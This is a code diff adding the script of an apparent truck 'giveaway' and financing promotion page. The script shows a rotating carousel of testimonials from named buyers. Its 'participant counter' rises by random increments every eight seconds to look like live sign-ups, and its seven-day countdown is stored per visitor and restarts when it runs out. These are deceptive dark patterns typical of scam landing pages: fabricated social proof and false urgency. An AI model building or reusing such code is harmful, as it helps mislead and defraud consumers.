+        { name: "Carlos Hernandez", country: "Mexico", text: "Light delivery truck is perfect for city deliveries. 10-year terms are great!", truck: "HOWO Light-Duty Delivery Truck" },
+        { name: "Santiago Fernandez", country: "Argentina", text: "Bus chassis converted for school transport. The 30% down made it possible!", truck: "HOWO Bus Chassis" },
+        { name: "Michael Brown", country: "USA", text: "Second truck from HOWO. Their financing is unbeatable!", truck: "HOWO Dump Truck" },
+        { name: "David Rodriguez", country: "Mexico", text: "My farm now has 3 HOWO trucks. Best decision ever!", truck: "HOWO Cargo Truck" },
+        { name: "Robert Anderson", country: "Canada", text: "30% down and 10 years to pay? No other company offers this!", truck: "HOWO Semi-Truck" },
+        { name: "Oliver Jones", country: "UK", text: "The flatbed is perfect for my lumber business. Thank you HOWO!", truck: "HOWO Flatbed Truck" },
+        { name: "Lukas Schmidt", country: "Germany", text: "German engineering is good, but HOWO gives better value!", truck: "HOWO Concrete Mixer" }
+    ];
+
+    const carouselContainer = document.getElementById('testimonialCarousel');
+    let currentSlide = 0;
+    const slidesPerView = 3;
+
+    function renderCarousel() {
+        carouselContainer.innerHTML = '';
+        const start = currentSlide * slidesPerView;
+        const end = start + slidesPerView;
+        const visible = testimonialsList.slice(start, end);
+        visible.forEach(t => {
+            const slide = document.createElement('div');
+            slide.className = 'testimonial-slide';
+            slide.innerHTML = `<strong>${t.name}</strong> ${t.country}<br>“${t.text}”<br><i class="fas fa-check-circle" style="color:#22C55E;"></i> Received: ${t.truck}`;
+            carouselContainer.appendChild(slide);
+        });
+    }
+    renderCarousel();
+
+    document.getElementById('prevTestimonial').onclick = () => { currentSlide = Math.max(0, currentSlide - 1); renderCarousel(); };
+    document.getElementById('nextTestimonial').onclick = () => { const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1; currentSlide = Math.min(maxSlide, currentSlide + 1); renderCarousel(); };
+    setInterval(() => { const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1; if (currentSlide >= maxSlide) currentSlide = 0; else currentSlide++; renderCarousel(); }, 8000);
+
+    // Participant counter
+    let participantCount = parseInt(localStorage.getItem('participantCount')) || 1247;
+    document.getElementById('participantCount').innerText = participantCount.toLocaleString();
+    document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString();
+    document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString();
+    setInterval(() => { const increment = Math.floor(Math.random() * 3) + 1; participantCount += increment; localStorage.setItem('participantCount', participantCount); document.getElementById('participantCount').innerText = participantCount.toLocaleString(); document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString(); document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString(); }, 8000);
+
+    // Countdown timer (7 days)
+    let endTime = localStorage.getItem('giveawayEndTime');
+    if (!endTime) { endTime = Date.now() + (7 * 24 * 60 * 60 * 1000); localStorage.setItem('giveawayEndTime', endTime); }
+    function updateCountdown() { const diff = endTime - Date.now(); if (diff <= 0) { localStorage.removeItem('giveawayEndTime'); location.reload(); return; } const days = Math.floor(diff / (1000 * 60 * 60 * 24)); const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)); const seconds = Math.floor((diff % (1000 * 60)) / 1000); document.getElementById('days').innerText = days.toString().padStart(2, '0'); document.getElementById('hours').innerText = hours.toString().padStart(2, '0'); document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0'); document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0'); }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    // Scroll buttons
+    document.getElementById('viewModelsBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
+    document.getElementById('heroClaimBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
+    document.getElementById('startClaimBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
+    document.getElementById('navClaimBtn')?.addEventListener('click', (e) => { e.preventDefault(); document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
+
+    // Footer navigation
+    document.querySelectorAll('.footer-nav-link').forEach(link => { link.addEventListener('click', (e) => { e.preventDefault(); const target = link.getAttribute('data-target'); if (target === 'giveaway') document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'info') document.getElementById('info-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'instruction') document.getElementById('instruction-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'transactions') document.getElementById('transactions-section')?.scrollIntoView({ behavior: 'smooth' }); }); });
+
+    renderTrucks();
+</script>
+</body>
+</html>
+
